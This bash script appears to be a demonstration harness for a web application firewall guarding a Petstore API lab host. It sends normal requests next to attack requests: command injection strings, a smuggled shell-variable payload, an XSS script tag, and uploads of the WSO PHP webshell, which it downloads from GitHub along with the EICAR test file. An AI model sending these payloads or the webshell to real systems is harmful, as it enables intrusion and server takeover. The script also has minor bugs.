#!/bin/bash

PETSTORE_URL='http://petstore.corp.fabriclab.ca/api/v3'

# wso.php is a backdoor/webshell and considered as a malware
wso_file="wso.php"
wso_url="https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso.php"
if [ ! -f "$wso_file" ]; then
    curl -sO $wso_url
fi

# eicar.txt is an Anti-Virus Test File
eicar_file="eicar.com.txt"
eicar_url="https://secure.eicar.org/eicar.com.txt"
if [ ! -f "$eicar_file" ]; then
    curl -sO $eicar_url
fi

# Encode content
WSO_CONTENT_JQ=$(jq -Rs . < $wso_file)
EICAR_CONTENT=$(< $eicar_file)

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[00;36m'
NC='\033[0m'

# Define the options for the menu
options=(
    'GET findByStatus?status=available                     - Normal Request'
    'GET findByStatus?status=sold                          - Normal Request'
    'GET findByStatus?status=pending                       - Normal Request'
    'GET findByStatus?                                     - Schema violation'
    'GET findByStatus?status=ABCDEFGHIJKL                  - URL too long'
    'GET findByStatus?status=A                             - URL too short'
    'GET findByStatus?status=;cmd.exe                      - Command Injection in URL'
    'POST {"status": "/bin/ls"}                            - Command Injection in JSON'
    'POST {"status": "xx& var1=l var2=s;\$var1\$var2"}     - Zero-Day in JSON'
    'POST {"status": "<script>alert(123)</script>"}       - XSS in JSON'
    'POST file=@wso.php                                   - Upload a Webshell'
    'POST file=@eicar.com.txt                             - Upload Eicar test file'
    'POST {"status": "*wso.php*"}                         - Webshell in JSON'
    'POST {"status": "*eicar.com.txt*"}                   - Eicar in JSON'
    'GET findByStatus?status=sold&status=pending          - Additional URL parameter'
    'GET accept: application/yaml                         - Non JSON request'
)

function get_status_available() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=available"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_sold() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=sold"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_pending() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=pending"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_empty() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_long() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=ABCDEFGHIJKL"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_short() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=A"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_command_injection() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=;cmd.exe"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function post_status_command_injection() {
    local COMMAND="curl -s -k -X"
    local METHOD="POST"
    local URL="${PETSTORE_URL}/pet"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local DATA='{"id": 110, "category": {"id": 110, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["photo.png"], "tags": [ {"id": 110, "name": "FortiCamel"}], "status": "/bin/ls"}'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER $DATA"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function post_status_zero_day() {
    local COMMAND="curl -s -k -X"
    local METHOD="POST"
    local URL="${PETSTORE_URL}/pet"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local DATA='{"id": 111, "category": {"id": 111, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["photo.png"], "tags": [ {"id": 111, "name": "FortiCamel"}], "status": "xx& var1=l var2=s;$var1$var2"}'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER $DATA"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function post_status_xss() {
    local COMMAND="curl -s -k -X"
    local METHOD="POST"
    local URL="${PETSTORE_URL}/pet"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local DATA='{"id": 111, "category": {"id": 111, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["photo.png"], "tags": [ {"id": 112, "name": "FortiCamel"}], "status": "<script>alert(123)</script>"}'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER $DATA"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function post_upload_wso() {
    local COMMAND="curl -s -k -X"
    local METHOD="POST"
    local URL="${PETSTORE_URL}/pet"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local DATA='-F "file=@wso.php;type=application/x-php" -F "data={"id": 110, "category": {"id": 110, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["photo.png"], "tags": [ {"id": 113, "name": "FortiCamel"}], "status": "sold"}'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER $DATA"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function post_upload_eicar() {
    local COMMAND="curl -s -k -X"
    local METHOD="POST"
    local URL="${PETSTORE_URL}/pet"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local DATA='-F "file=@eicar.com.txt;type=text/plain" -F "data={"id": 110, "category": {"id": 110, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["photo.png"], "tags": [ {"id": 113, "name": "FortiCamel"}], "status": "sold"}'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER $DATA"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function post_status_wso() {
    local COMMAND="curl -s -k -X"
    local METHOD="POST"
    local URL="${PETSTORE_URL}/pet"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local DATA='{"id": 111, "category": {"id": 111, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["photo.png"], "tags": [ {"id": 112, "name": "FortiCamel"}], "status": $WSO_CONTENT}'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER $DATA"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function post_status_eicar() {
    local COMMAND="curl -s -k -X"
    local METHOD="POST"
    local URL="${PETSTORE_URL}/pet"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local DATA='{"id": 111, "category": {"id": 111, "name": "Camel"}, "name": "FortiCamel", "photoUrls": ["photo.png"], "tags": [ {"id": 112, "name": "FortiCamel"}], "status": "${EICAR_CONTENT}"}'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER $DATA"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_duplicate() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=sold&status=pending"
    local HEADER='-H "Accept: application/json" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function get_status_yaml() {
    local COMMAND="curl -s -k -X"
    local METHOD="GET"
    local URL="${PETSTORE_URL}/pet/findByStatus?status=sold"
    local HEADER='-H "Accept: application/yaml" -H "Content-Type: application/json"'
    local FULL_COMMAND="$COMMAND $METHOD $URL $HEADER"

    echo -e "${CYAN}Executing: $FULL_COMMAND${NC}"
    eval "$FULL_COMMAND"
}

function select_option() {
    clear
    echo
    echo "Choose an option:"
    echo
    for i in "${!options[@]}"; do
        echo "$((i+1)). ${options[$i]}"
    done

    echo
    read -p "Enter your choice (1-${#options[@]}): " choice
    if ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#options[@]} )); then
        echo -e "${RED}Invalid choice. Please try again.${NC}"
        read -p "Press Enter to continue..."
        select_option
        return
    fi

    case $((choice-1)) in
        0) get_status_available ;;
        1) get_status_sold ;;
        2) get_status_pending ;;
        3) get_status_empty ;;
        4) get_status_long ;;
        5) get_status_short ;;
        6) get_status_command_injection ;;
        7) post_status_command_injection ;;
        8) post_status_zero_day ;;
        9) post_status_xss ;;
        10) post_upload_wso ;;
        11) post_upload_eicar ;;
        12) post_status_wso ;;
        13) post_status_eicar ;;
        14) get_status_duplicate ;;
        15) get_status_short ;;
    esac

    echo
    local output=$(eval ${curl_commands[$command_index]} 2>&1)
    if [[ "$output" == "Request Blocked by FortiWeb!" ]]; then
        echo -e "${RED}$output${NC}"
    else
        echo -e "${GREEN}$output${NC}"
    fi
    echo
    read -p "Press Enter to continue..."
    select_option
}

select_option
